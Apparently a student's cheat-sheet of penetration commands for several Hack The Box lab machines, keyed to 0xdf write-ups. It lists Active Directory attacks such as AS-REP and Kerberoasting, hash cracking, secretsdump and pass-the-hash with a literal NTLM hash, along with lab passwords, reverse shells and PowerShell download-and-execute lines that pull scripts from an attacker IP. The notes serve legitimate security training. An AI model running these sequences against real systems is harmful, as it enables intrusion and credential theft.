# Win-Conceal
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```
nmap -sU
snmpwalk
john
ipsec up conceal
ftp
webshell .asp
reverse shell - PowerShell
JuicyPotato
```


# Win-Forest
https://0xdf.gitlab.io/2020/03/21/htb-forest.html
```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
enum4linux 10.10.10.161
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
john hashsvc -w=/usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
iex(new-object net.webclient).downloadstring("http://10.10.14.13/SharpHound.ps1")
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
./smbserver.py share . -smb2support -username df -password df
iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
./secretsdump.py svc-alfresco:s3rvice@10.10.10.161
./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```


# Win-Active
https://0xdf.gitlab.io/2018/12/08/htb-active.html
```
enum4linux 10.10.10.100
smbclient \\\\10.10.10.100\\Replication
gpp-decrypt
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
john hashadmin -w=/usr/share/wordlists/rockyou.txt
./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
./psexec.py Administrator:Ticketmaster1968@10.10.10.100
```


# Win-Search
https://0xdf.gitlab.io/2022/04/30/htb-search.html
```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
sheetProtection
pfx2john staff.pfx > pfx_hash
./SharpHound.exe
./smbserver.py share . -smb2support -username df -password df
./BloodHound
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```


# Win-StreamIO
```
SQL Injection
ffuf with authentication
evil-winrm
winPEAS
BloodHound
PowerView.ps1
```





# Lin-Bashed
https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
/dev/phpbash.php
reverse shell - python
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -l
sudo -u scriptmanager bash -i
python -c shell.py
```


# Lin-SolidState
https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
```
nc 10.10.10.51 4555
telnet 10.10.10.51 110
Escape rbash
LinEnum.sh
reverse shell - nc
move to bash
```


# Lin-Jarvis
https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
```
SQL injection
Webshell
sudo -l
Reverse Shell - Bash
LinEnum.sh
PrivEsc - systemctl
```


# Lin-Haircut
```
/exposed.php
php-reverse-shell
10.10.10.24/uploads/shell2.php
LinEnum.sh
screen 4.5.0
```

# Lin-Backdoor
https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
```
nmap -p- 10.10.11.125
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://backdoor.htb/wp-content/FUZZ -e .aspx,.php,.txt,.html
WP Plugins-EbookDL Dir Trav
gdbserver RCE
ps & screen
```
